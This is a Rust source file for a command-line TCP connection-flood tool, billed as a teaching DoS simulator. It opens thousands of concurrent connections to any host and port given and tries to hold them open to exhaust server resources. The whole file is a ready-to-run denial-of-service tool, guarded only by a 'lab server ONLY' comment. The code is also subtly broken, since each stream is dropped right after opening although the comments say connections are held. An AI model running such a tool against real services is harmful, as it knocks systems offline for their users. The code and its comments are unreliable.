//! TCP Connection Flood (teaching-friendly DoS simulator)
//!
//! Usage examples:
//!   cargo run --example tcp_conn_flood -- 127.0.0.1:8080 --conns 2000 --concurrency 400 --hold-ms 30000
//!   cargo run --example tcp_conn_flood -- 10.0.0.5:80 --conns 5000 --concurrency 1000 --hold-ms 60000
//!
//! Notes:
//! - Use against your own lab server ONLY.
//! - For larger tests, you may need: `ulimit -n 65535`.
//! - This intentionally completes TCP handshakes (not raw SYN).

use std::{env, net::SocketAddr, str::FromStr, sync::Arc, time::Duration};
use tokio::{
  io::AsyncWriteExt,
  net::{TcpSocket, TcpStream},
  signal,
  time::{sleep, timeout},
};

#[derive(Clone, Debug)]
struct Args {
  target: SocketAddr,
  total_conns: usize,
  concurrency: usize,
  hold_ms: u64,
  connect_timeout_ms: u64,
  ramp_ms: u64,
}

fn parse_args() -> Args {
  let mut args = env::args().skip(1).collect::<Vec<_>>();
  if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
    eprintln!(
"Usage:
  tcp_conn_flood <host:port> [--conns N] [--concurrency N] [--hold-ms MS] [--connect-timeout-ms MS] [--ramp-ms MS]

Defaults:
  --conns 1000
  --concurrency 200
  --hold-ms 30000
  --connect-timeout-ms 3000
  --ramp-ms 0"
        );
    std::process::exit(1);
  }

  let target =
    SocketAddr::from_str(&args.remove(0)).expect("Target must be host:port, e.g., 127.0.0.1:8080");

  let mut total_conns = 1000usize;
  let mut concurrency = 200usize;
  let mut hold_ms = 30_000u64;
  let mut connect_timeout_ms = 3_000u64;
  let mut ramp_ms = 0u64;

  let mut it = args.into_iter();
  while let Some(flag) = it.next() {
    match flag.as_str() {
      "--conns" => total_conns = it.next().unwrap().parse().unwrap(),
      "--concurrency" => concurrency = it.next().unwrap().parse().unwrap(),
      "--hold-ms" => hold_ms = it.next().unwrap().parse().unwrap(),
      "--connect-timeout-ms" => connect_timeout_ms = it.next().unwrap().parse().unwrap(),
      "--ramp-ms" => ramp_ms = it.next().unwrap().parse().unwrap(),
      other => panic!("Unknown flag: {}", other),
    }
  }

  Args {
    target,
    total_conns,
    concurrency,
    hold_ms,
    connect_timeout_ms,
    ramp_ms,
  }
}

async fn open_and_hold(
  target: SocketAddr,
  connect_timeout: Duration,
  hold: Duration,
) -> std::io::Result<TcpStream> {
  let socket = if target.is_ipv4() {
    TcpSocket::new_v4()?
  } else {
    TcpSocket::new_v6()?
  };

  let mut stream = timeout(connect_timeout, socket.connect(target)).await??;

  // Optional: send a byte to “tickle” some servers into allocating read-side resources.
  let _ = timeout(Duration::from_millis(200), async {
    // This needs &mut stream (fix for E0596)
    let _ = stream.write_all(b"\r\n").await;
  })
  .await;

  // Keep the connection open for `hold`.
  tokio::spawn(async move {
    sleep(hold).await;
    // Drop at end of task (connection closes).
  });

  Ok(stream)
}

#[tokio::main]
async fn main() -> std::io::Result<()> {
  let args = parse_args();
  eprintln!(
    "Target: {}, total_conns: {}, concurrency: {}, hold_ms: {}, connect_timeout_ms: {}, ramp_ms: {}",
    args.target,
    args.total_conns,
    args.concurrency,
    args.hold_ms,
    args.connect_timeout_ms,
    args.ramp_ms
  );

  let connect_timeout = Duration::from_millis(args.connect_timeout_ms);
  let hold = Duration::from_millis(args.hold_ms);

  // Simple semaphore using mpsc capacity
  let (tx, mut rx) = tokio::sync::mpsc::channel::<()>(args.concurrency);
  for _ in 0..args.concurrency {
    tx.send(()).await.ok();
  }
  let tx = Arc::new(tx);

  let mut opened = 0usize;
  let mut handles = Vec::with_capacity(args.total_conns);

  let shutdown = signal::ctrl_c();
  tokio::pin!(shutdown);

  for _ in 0..args.total_conns {
    tokio::select! {
        _ = &mut shutdown => {
            eprintln!("Interrupted. Shutting down gracefully...");
            break;
        }
        Some(_) = rx.recv() => {
            let tx_clone = Arc::clone(&tx);
            let target = args.target;
            let ct = connect_timeout;
            let hold_dur = hold;

            if args.ramp_ms > 0 {
                sleep(Duration::from_millis(args.ramp_ms)).await;
            }

            let h = tokio::spawn(async move {
                // PermitOnDrop now stores Arc<Sender<()>> (fix for E0308)
                let _permit_return = PermitOnDrop(tx_clone);
                match open_and_hold(target, ct, hold_dur).await {
                    Ok(_s) => { /* connection is held by the spawned task above */ }
                    Err(e) => {
                        eprintln!("connect error: {}", e);
                    }
                }
            });
            handles.push(h);
            opened += 1;
            if opened % 100 == 0 {
                eprintln!("Opened {} connections...", opened);
            }
        }
    }
  }

  for h in handles {
    let _ = h.await;
  }

  eprintln!("Done. Held connections will release after hold-ms timeout.");
  Ok(())
}

// Now holds Arc<Sender<()>> so it matches the call site.
struct PermitOnDrop(Arc<tokio::sync::mpsc::Sender<()>>);
impl Drop for PermitOnDrop {
  fn drop(&mut self) {
    let _ = self.0.try_send(());
  }
}
